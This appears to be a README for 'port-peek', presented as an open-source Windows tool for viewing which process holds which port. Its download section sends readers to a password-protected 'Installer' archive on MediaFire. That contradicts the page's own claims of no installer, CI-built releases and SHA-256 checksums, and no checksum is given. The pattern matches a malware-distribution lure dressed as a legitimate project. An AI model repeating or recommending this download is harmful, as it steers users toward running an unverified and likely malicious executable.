# port-peek

🚪 Free, open-source port viewer for Windows — see which process listens on which port, kill it safely. 100 MB portable, offline, MIT.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **Live socket table** — TCP and UDP endpoints with local port, remote address and owning process
- ✅ **Process identity** — executable path and PID resolved automatically, no netstat dash-o guessing
- ✅ **Port conflict finder** — search any port number and see every claimant at once
- ✅ **Safe close action** — end one connection or the whole process with a confirmation naming the exe
- ✅ **New listener watch** — tray alert when an app starts listening, useful after installs
- ✅ **Filter presets** — LISTENING only, established only, or a saved filter for your dev ports
- ✅ **100 MB self-contained exe** — runtime bundled, portable, offline, MIT with SHA-256 releases

## Why port-peek

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB exe - no installer, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **port-peek** | TCPView | CurrPorts | netstat |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Free | Free | Built-in |
| Open source | **Yes** | No | No | No |
| Port conflict search | **Yes** | Manual | No | Manual |
| New listener tray alerts | **Yes** | No | No | No |
| Safe close with exe name | **Yes** | Yes | Partial | No |
| Portable, no install | **Yes, 100 MB** | Zip | Zip | With OS |

## FAQ

**how to check which program is using a port on Windows?**

netstat gives a PID you then have to match in Task Manager, which is slow every single time and worse in a hurry. port-peek resolves process names and paths next to each socket and can search by port to expose every claimant in one view. It is a 100 MB portable exe, MIT, offline with SHA-256 releases.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark socket table (#121418, cyan #22D3EE): LISTENING rows with port, PID and path columns, search field typed 8080, conflict badge on one row.
2. Connection drawer: process icon and path for node.exe, established peers list with remote IPs, Close connection action in red outline.
3. Watch panel: tray alert toggle on, filter presets mounted, saved dev-ports filter, activity log of new listeners at 16:22.

## Download

| Source | Link |
|---|---|
| 💾 **Installer port-peek** | [Installer port-peek](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).